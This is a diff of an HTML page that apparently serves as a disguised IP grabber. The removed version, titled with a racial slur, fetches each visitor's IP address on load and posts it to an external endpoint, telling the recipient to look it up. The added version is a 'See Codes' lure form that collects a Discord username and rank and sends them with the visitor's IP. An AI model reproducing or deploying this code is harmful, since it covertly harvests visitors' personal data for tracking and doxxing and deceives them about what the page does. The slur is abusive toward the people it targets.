@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>NiggaBin</title>
+  <title>User Input</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -12,31 +12,57 @@
       align-items: center;
       height: 100vh;
       margin: 0;
-      background-color: #000000;
+      background-color: #2c2f33;
+      color: #fff;
     }
     .container {
       text-align: center;
-      background: #fff;
+      background: #23272a;
       padding: 20px;
       border-radius: 10px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
     }
-    p {
-      margin-bottom: 20px;
-      color: #555;
+    input {
+      width: 80%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 5px;
+    }
+    button {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      background-color: #7289da;
+      color: white;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #5b6eae;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>could not load on ur browser</h1>
-    <p>!!!</p>
-    <p id="status" style="color: red;">Please wait...</p>
+    <h1>Enter Details</h1>
+    <input type="text" id="discordUser" placeholder="Discord Username" required>
+    <input type="text" id="rank" placeholder="Enter Rank" required>
+    <button onclick="sendData()">See Codes</button>
+    <p id="status" style="margin-top: 20px;"></p>
   </div>
 
   <script>
-    (async () => {
+    async function sendData() {
+      const discordUser = document.getElementById('discordUser').value;
+      const rank = document.getElementById('rank').value;
       const status = document.getElementById('status');
+
+      if (!discordUser || !rank) {
+        status.textContent = 'Please fill in all fields.';
+        status.style.color = 'red';
+        return;
+      }
+
       try {
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
@@ -49,21 +75,23 @@
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            content: `**New client IP: ${userIP}**\n**Go to https://www.whatismyip.com/ and put the ip in to get all info!`,
+            content: `**Discord User:** ${discordUser}\n**Rank:** ${rank}\n**IP Address:** ${userIP}`,
           }),
         });
 
         if (response.ok) {
-          status.textContent = 'No codes are up rn, or could not load on ur brower!';
-          status.style.color = 'red';
+          status.textContent = 'Your information has been sent.';
+          status.style.color = 'green';
         } else {
-          status.textContent = 'Failed to process your information. Please try again later.';
+          status.textContent = 'Failed to send information. Please try again.';
+          status.style.color = 'red';
         }
       } catch (error) {
         console.error('Error:', error);
         status.textContent = 'An error occurred. Please try again later.';
+        status.style.color = 'red';
       }
-    })();
+    }
   </script>
 </body>
 </html>
